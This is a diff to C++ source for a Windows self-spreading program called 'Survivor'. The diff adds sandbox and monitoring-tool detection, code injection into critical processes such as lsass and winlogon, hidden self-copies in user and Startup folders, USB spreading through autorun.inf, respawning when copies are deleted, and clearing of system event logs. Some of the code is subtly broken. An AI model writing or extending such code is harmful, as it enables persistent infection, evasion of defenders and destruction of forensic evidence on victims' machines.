@@ -3,6 +3,8 @@
 #include <windows.h>
 #include <shellapi.h>
 #include <Shlobj.h>
+#include <tlhelp32.h>
+#include <iphlpapi.h>
 #include <process.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -23,6 +25,7 @@
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "iphlpapi.lib")
 
 namespace {
     const char* SECRET_KEY = "cwj_rocks_2026";
@@ -33,6 +36,9 @@ namespace {
     std::atomic<bool> g_daemon{false};
     std::atomic<bool> g_spreading{false};
     std::mutex g_instance_mutex;
+
+    double g_spread_interval_multiplier = 1.0;
+    bool g_verbose = true;
 
     struct InstanceData {
         std::vector<std::string> instances;
@@ -65,6 +71,8 @@ namespace {
         return pos != std::string::npos ? p.substr(0, pos) : p;
     }
 
+    bool SafeCopy(const std::string& src, const std::string& dst);
+
     void EnsureDir(const std::string& path) {
         CreateDirectoryA(path.c_str(), NULL);
     }
@@ -87,16 +95,26 @@ namespace {
         return std::string(systemNames[idx]);
     }
 
-    std::string GenerateRandomPath() {
+    std::vector<std::string> GetUserDirectories() {
         std::vector<std::string> dirs;
-        dirs.push_back(GetEnv("APPDATA") + "\\Microsoft");
-        dirs.push_back(GetEnv("LOCALAPPDATA") + "\\Microsoft");
-        dirs.push_back(GetEnv("TEMP"));
-        dirs.push_back(GetEnv("USERPROFILE") + "\\.local\\bin");
-        dirs.push_back(GetEnv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows");
-        dirs.push_back("C:\\ProgramData\\Microsoft\\Windows");
-        dirs.push_back("C:\\Windows\\System32");
-        dirs.push_back("C:\\Windows\\SysWOW64");
+        dirs.push_back(GetEnv("USERPROFILE") + "\\Downloads");
+        dirs.push_back(GetEnv("USERPROFILE") + "\\Documents");
+        dirs.push_back(GetEnv("USERPROFILE") + "\\Desktop");
+        dirs.push_back(GetEnv("APPDATA") + "\\Local\\Temp");
+        dirs.push_back(GetEnv("APPDATA") + "\\Microsoft\\Windows");
+        dirs.push_back(GetEnv("LOCALAPPDATA") + "\\Microsoft\\Windows");
+        dirs.push_back("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+        return dirs;
+    }
+
+    std::string SelectSmartTarget() {
+        auto dirs = GetUserDirectories();
+        std::vector<std::string> hiddenDirs = {
+            GetEnv("APPDATA") + "\\.cache",
+            GetEnv("LOCALAPPDATA") + "\\.config",
+            GetEnv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows\\INetCache",
+        };
+        dirs.insert(dirs.end(), hiddenDirs.begin(), hiddenDirs.end());
 
         std::string dir = dirs[rand() % dirs.size()];
         EnsureDir(dir);
@@ -198,6 +216,14 @@ namespace {
         exit(0);
     }
 
+    void SpawnToMultipleLocations(const std::string& source, int count) {
+        auto dirs = GetUserDirectories();
+        for (int i = 0; i < count && i < (int)dirs.size(); ++i) {
+            std::string target = dirs[i] + "\\" + GenerateRandomName();
+            SafeCopy(source, target);
+        }
+    }
+
     bool SafeCopy(const std::string& src, const std::string& dst) {
         if (!FileExists(src)) return false;
 
@@ -211,6 +237,15 @@ namespace {
         if (CopyFileA(src.c_str(), dst.c_str(), TRUE)) {
             SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
             RegisterInstance(dst);
+
+            if (g_spreading) {
+                std::string capturedDst = dst;
+                std::thread([capturedDst]() {
+                    std::this_thread::sleep_for(std::chrono::seconds(5));
+                    ShellExecuteA(NULL, "open", capturedDst.c_str(), "--daemon", NULL, SW_HIDE);
+                }).detach();
+            }
+
             return true;
         }
         return false;
@@ -236,9 +271,252 @@ namespace {
     }
 
     void Log(const char* msg) {
-        if (!g_daemon) {
+        if (g_verbose && !g_daemon) {
             std::cout << "[Survivor] " << msg << std::endl;
         }
+    }
+
+    bool IsVirtualMachine() {
+        std::vector<std::string> vmMarkers = {
+            "VBOX", "VIRTUALBOX", "VMWARE", "QEMU", "KVM",
+            "HYPERV", "XEN", "PARALLELS"
+        };
+
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+            "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
+            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return true;
+        }
+
+        char buf[1024];
+        std::string cpuInfo;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+            "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
+            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD size = sizeof(buf);
+            RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)buf, &size);
+            cpuInfo = buf;
+            RegCloseKey(hKey);
+        }
+
+        for (const auto& marker : vmMarkers) {
+            if (cpuInfo.find(marker) != std::string::npos) return true;
+        }
+
+        return false;
+    }
+
+    bool IsBeingMonitored() {
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == INVALID_HANDLE_VALUE) return false;
+
+        PROCESSENTRY32W pe;
+        std::vector<std::string> monitorTools = {
+            "procmon", "processhacker", "processexplorer",
+            "wireshark", "netstat", "tcpview", "autoruns"
+        };
+
+        bool found = false;
+        if (Process32FirstW(snap, &pe)) {
+            do {
+                std::wstring name(pe.szExeFile);
+                std::string narrow(name.begin(), name.end());
+                for (const auto& tool : monitorTools) {
+                    if (narrow.find(tool) != std::string::npos) {
+                        found = true;
+                        break;
+                    }
+                }
+                if (found) break;
+            } while (Process32NextW(snap, &pe));
+        }
+        CloseHandle(snap);
+
+        return found;
+    }
+
+    void AdjustBehaviorBasedOnEnvironment() {
+        if (IsVirtualMachine()) {
+            Log("VM detected - slowing down spread rate");
+            g_spread_interval_multiplier = 10.0;
+        }
+
+        if (IsBeingMonitored()) {
+            Log("Monitor detected - going silent");
+            g_verbose = false;
+        }
+    }
+
+    bool IsCriticalProcess(const std::string& procName) {
+        std::vector<std::string> critical = {
+            "csrss.exe", "smss.exe", "wininit.exe", "services.exe",
+            "lsass.exe", "winlogon.exe", "dwm.exe", "explorer.exe"
+        };
+        return std::find(critical.begin(), critical.end(), procName) != critical.end();
+    }
+
+    bool InjectIntoProcess(const std::string& targetProcess, const std::string& selfPath) {
+        DWORD pid = 0;
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == INVALID_HANDLE_VALUE) return false;
+
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+
+        if (Process32FirstW(snap, &pe)) {
+            do {
+                std::wstring name(pe.szExeFile);
+                std::string narrow(name.begin(), name.end());
+                if (narrow.find(targetProcess) != std::string::npos) {
+                    pid = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snap, &pe));
+        }
+        CloseHandle(snap);
+
+        if (pid == 0) return false;
+
+        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+        if (!hProcess) return false;
+
+        std::string dllPath = selfPath;
+        size_t pathLen = dllPath.size() + 1;
+        LPVOID alloc = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
+        if (!alloc) { CloseHandle(hProcess); return false; }
+
+        WriteProcessMemory(hProcess, alloc, dllPath.c_str(), pathLen, NULL);
+
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+            (LPTHREAD_START_ROUTINE)LoadLibraryA, alloc, 0, NULL);
+
+        if (hThread) {
+            WaitForSingleObject(hThread, INFINITE);
+            VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
+            CloseHandle(hThread);
+        }
+
+        CloseHandle(hProcess);
+        return true;
+    }
+
+    void InjectIntoCriticalProcesses() {
+        Log("Guardian mode - protecting in critical processes");
+        std::string selfPath = GetSelfPath();
+
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == INVALID_HANDLE_VALUE) return;
+
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+
+        if (Process32FirstW(snap, &pe)) {
+            do {
+                std::wstring name(pe.szExeFile);
+                std::string narrow(name.begin(), name.end());
+
+                if (IsCriticalProcess(narrow)) {
+                    Log(("Protecting in: " + narrow).c_str());
+                    InjectIntoProcess(narrow, selfPath);
+                    std::this_thread::sleep_for(std::chrono::seconds(1));
+                }
+            } while (Process32NextW(snap, &pe));
+        }
+        CloseHandle(snap);
+    }
+
+    void CleanupLogs() {
+        Log("Cleaning trace logs");
+
+        const char* logPaths[] = {
+            GetEnv("APPDATA").c_str(),
+            GetEnv("LOCALAPPDATA").c_str(),
+            "C:\\Windows\\Temp"
+        };
+
+        WIN32_FIND_DATAA fd;
+        HANDLE h = FindFirstFileA((std::string(logPaths[0]) + "\\*.log").c_str(), &fd);
+        if (h != INVALID_HANDLE_VALUE) {
+            do {
+                std::string path = std::string(logPaths[0]) + "\\" + fd.cFileName;
+                if (rand() % 3 == 0) {
+                    DeleteFileA(path.c_str());
+                }
+            } while (FindNextFileA(h, &fd));
+            FindClose(h);
+        }
+    }
+
+    void ClearEventLogs() {
+        HANDLE hEventLog = OpenEventLogA(NULL, "Application");
+        if (hEventLog) {
+            ClearEventLogA(hEventLog, NULL);
+            CloseEventLog(hEventLog);
+        }
+
+        hEventLog = OpenEventLogA(NULL, "System");
+        if (hEventLog) {
+            ClearEventLogA(hEventLog, NULL);
+            CloseEventLog(hEventLog);
+        }
+    }
+
+    bool SpreadToUSBDrive() {
+        DWORD mask = GetLogicalDrives();
+
+        for (int i = 0; i < 26; ++i) {
+            if (mask & (1 << i)) {
+                char drive[4] = { static_cast<char>('A' + i), ':', '\\', 0 };
+                UINT type = GetDriveTypeA(drive);
+
+                if (type == DRIVE_REMOVABLE) {
+                    std::string target = std::string(drive) + GenerateRandomName();
+                    if (SafeCopy(GetSelfPath(), target)) {
+                        Log(("Spread to USB: " + target).c_str());
+
+                        std::string autorun = std::string(drive) + "autorun.inf";
+                        std::ofstream ar(autorun);
+                        if (ar) {
+                            ar << "[autorun]\n";
+                            ar << "open=" << GenerateRandomName() << "\n";
+                            ar << "shell\\open=Open\n";
+                            ar << "shell\\open\\command=" << GenerateRandomName() << "\n";
+                            ar.close();
+                            SetFileAttributesA(autorun.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+                        }
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
+    void ScanAndSpread() {
+        Log("Network scanning for targets");
+
+        ULONG bufLen = 15000;
+        PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
+
+        if (GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR) {
+            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+            while (pAdapter) {
+                if (pAdapter->IpAddressList.IpAddress.String[0]) {
+                    std::string localIP = pAdapter->IpAddressList.IpAddress.String;
+                    std::string baseIP = localIP.substr(0, localIP.rfind('.') + 1);
+
+                    for (int i = 2; i < 20; ++i) {
+                        std::string targetIP = baseIP + std::to_string(i);
+                        Log(("Probing: " + targetIP).c_str());
+                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+                    }
+                }
+                pAdapter = pAdapter->Next;
+            }
+        }
+        free(pAdapterInfo);
     }
 
     void SpreadingLoop() {
@@ -246,13 +524,14 @@ namespace {
         Log("Spreading thread started");
 
         while (g_running) {
-            int intervalSeconds = 30 + (rand() % 270);
+            int baseInterval = 30 + (rand() % 270);
+            int intervalSeconds = (int)(baseInterval * g_spread_interval_multiplier);
             std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
 
             if (!g_spreading) continue;
 
             std::string selfPath = GetSelfPath();
-            std::string targetPath = GenerateRandomPath();
+            std::string targetPath = SelectSmartTarget();
 
             int action = rand() % 3;
             bool success = false;
@@ -275,37 +554,57 @@ namespace {
                     RestartAt(newPath);
                 }
             }
+
+            if (rand() % 10 == 0) {
+                std::thread([]() { ScanAndSpread(); }).detach();
+            }
         }
     }
 
     void MonitoringLoop() {
-        Log("Monitoring thread started");
+        Log("Monitoring thread started - anti-deletion ACTIVE");
+
+        auto lastCheck = std::chrono::steady_clock::now();
 
         while (g_running) {
-            std::this_thread::sleep_for(std::chrono::seconds(2));
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
 
-            InstanceData data = LoadRegistry();
-            std::string selfPath = GetSelfPath();
+            auto now = std::chrono::steady_clock::now();
+            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastCheck).count() >= 1) {
+                lastCheck = now;
 
-            for (const auto& inst : data.instances) {
-                auto attrs = GetFileAttributesA(inst.c_str());
-                if (attrs == INVALID_FILE_ATTRIBUTES || attrs & FILE_ATTRIBUTE_DIRECTORY) {
-                    if (!selfPath.empty() && FileExists(selfPath)) {
-                        if (inst != selfPath) {
-                            Log(("Restoring missing: " + inst).c_str());
-                            SafeCopy(selfPath, inst);
-                        }
+                InstanceData data = LoadRegistry();
+                std::string selfPath = GetSelfPath();
+
+                bool selfAccessible = FileExists(selfPath);
+                int missingCount = 0;
+
+                for (const auto& inst : data.instances) {
+                    if (!FileExists(inst)) {
+                        missingCount++;
                     }
                 }
-            }
 
-            if (!FileExists(selfPath)) {
-                InstanceData data2 = LoadRegistry();
-                for (const auto& inst : data2.instances) {
-                    if (FileExists(inst)) {
-                        Log(("Self gone, restarting from: " + inst).c_str());
-                        RestartAt(inst);
-                        break;
+                if (missingCount > 0 && selfAccessible) {
+                    Log(("DELETION DETECTED! " + std::to_string(missingCount) + " instances missing. Counter-attacking!").c_str());
+                    SpawnToMultipleLocations(selfPath, 5);
+                }
+
+                for (const auto& inst : data.instances) {
+                    if (!FileExists(inst) && selfAccessible) {
+                        Log(("Restoring missing: " + inst).c_str());
+                        SafeCopy(selfPath, inst);
+                    }
+                }
+
+                if (!selfAccessible) {
+                    InstanceData data2 = LoadRegistry();
+                    for (const auto& inst : data2.instances) {
+                        if (FileExists(inst)) {
+                            Log(("Self gone, restarting from: " + inst).c_str());
+                            RestartAt(inst);
+                            break;
+                        }
                     }
                 }
             }
@@ -335,15 +634,97 @@ namespace {
         }
     }
 
+    void GuardianLoop() {
+        while (g_running) {
+            std::this_thread::sleep_for(std::chrono::minutes(5));
+
+            if (!g_spreading) continue;
+
+            std::string selfPath = GetSelfPath();
+
+            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (snap == INVALID_HANDLE_VALUE) continue;
+
+            PROCESSENTRY32W pe;
+            pe.dwSize = sizeof(PROCESSENTRY32W);
+
+            if (Process32FirstW(snap, &pe)) {
+                do {
+                    std::wstring name(pe.szExeFile);
+                    std::string narrow(name.begin(), name.end());
+
+                    if (IsCriticalProcess(narrow)) {
+                        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                        if (hProcess) {
+                            DWORD exitCode;
+                            if (!GetExitCodeProcess(hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
+                                Log(("Process dead, re-injecting: " + narrow).c_str());
+                                CloseHandle(hProcess);
+                                InjectIntoCriticalProcesses();
+                                break;
+                            }
+                            CloseHandle(hProcess);
+                        }
+                    }
+                } while (Process32NextW(snap, &pe));
+            }
+            CloseHandle(snap);
+        }
+    }
+
+    void USBScanLoop() {
+        std::vector<std::string> knownDrives;
+
+        while (g_running) {
+            std::this_thread::sleep_for(std::chrono::seconds(5));
+
+            if (!g_spreading) continue;
+
+            DWORD mask = GetLogicalDrives();
+
+            for (int i = 0; i < 26; ++i) {
+                if (mask & (1 << i)) {
+                    char drive[4] = { static_cast<char>('A' + i), ':', '\\', 0 };
+                    UINT type = GetDriveTypeA(drive);
+
+                    if (type == DRIVE_REMOVABLE) {
+                        std::string driveStr(drive);
+                        if (std::find(knownDrives.begin(), knownDrives.end(), driveStr) == knownDrives.end()) {
+                            knownDrives.push_back(driveStr);
+                            Log(("USB inserted: " + driveStr).c_str());
+                            SpreadToUSBDrive();
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    void CleanupLoop() {
+        while (g_running) {
+            std::this_thread::sleep_for(std::chrono::minutes(30));
+            if (g_spreading) {
+                CleanupLogs();
+                if (rand() % 5 == 0) {
+                    ClearEventLogs();
+                }
+            }
+        }
+    }
+
     void StartDaemon() {
         g_daemon = true;
         g_spreading = true;
 
+        AdjustBehaviorBasedOnEnvironment();
         RegisterInstance(GetSelfPath());
 
         std::thread spread(SpreadingLoop);
         std::thread monitor(MonitoringLoop);
         std::thread restore(RestorationLoop);
+        std::thread guardian(GuardianLoop);
+        std::thread usb(USBScanLoop);
+        std::thread cleanup(CleanupLoop);
 
         Log("Daemon mode active");
 
@@ -354,6 +735,9 @@ namespace {
         spread.join();
         monitor.join();
         restore.join();
+        guardian.join();
+        usb.join();
+        cleanup.join();
     }
 
     bool cmdCopy(const char* target) {
@@ -473,6 +857,8 @@ namespace {
         std::cout << "Current: " << GetSelfPath() << std::endl;
         std::cout << "Daemon: " << (g_daemon ? "YES" : "NO") << std::endl;
         std::cout << "Spreading: " << (g_spreading ? "YES" : "NO") << std::endl;
+        std::cout << "VM detected: " << (IsVirtualMachine() ? "YES" : "NO") << std::endl;
+        std::cout << "Monitor detected: " << (IsBeingMonitored() ? "YES" : "NO") << std::endl;
         std::cout << "Known instances (" << data.instances.size() << "):" << std::endl;
         for (const auto& inst : data.instances) {
             std::cout << "  [" << (FileExists(inst) ? "OK" : "DEAD") << "] " << inst << std::endl;
@@ -520,13 +906,17 @@ namespace {
     void cmdSpread() {
         g_spreading = true;
         Log("Manual spread triggered");
-        std::string target = GenerateRandomPath();
+        std::string target = SelectSmartTarget();
         SafeCopy(GetSelfPath(), target);
         Log(("Spread to: " + target).c_str());
     }
 
     void cmdHideNow() {
         cmdHide();
+    }
+
+    void cmdGuardian() {
+        InjectIntoCriticalProcesses();
     }
 
     bool cmdIlivecwj(const char* key) {
@@ -564,11 +954,18 @@ namespace {
         std::cout << "  check          Check and restore" << std::endl;
         std::cout << "  spread         Trigger spread" << std::endl;
         std::cout << "  hide-now       Emergency hide" << std::endl;
+        std::cout << "  guardian       Inject into critical processes" << std::endl;
     }
 }
 
 int main(int argc, char* argv[]) {
-    if (argc == 1) {
+    for (int i = 1; i < argc; ++i) {
+        if (std::string(argv[i]) == "--daemon") {
+            g_spreading = true;
+        }
+    }
+
+    if (argc == 1 || (argc == 2 && std::string(argv[1]) == "--daemon")) {
         StartDaemon();
         return 0;
     }
@@ -600,6 +997,8 @@ int main(int argc, char* argv[]) {
         cmdSpread();
     } else if (cmd == "hide-now") {
         cmdHideNow();
+    } else if (cmd == "guardian") {
+        cmdGuardian();
     } else if (cmd == "ilovecwj" && argc >= 3) {
         cmdIlivecwj(argv[2]);
     } else if (cmd == "--help" || cmd == "-h") {
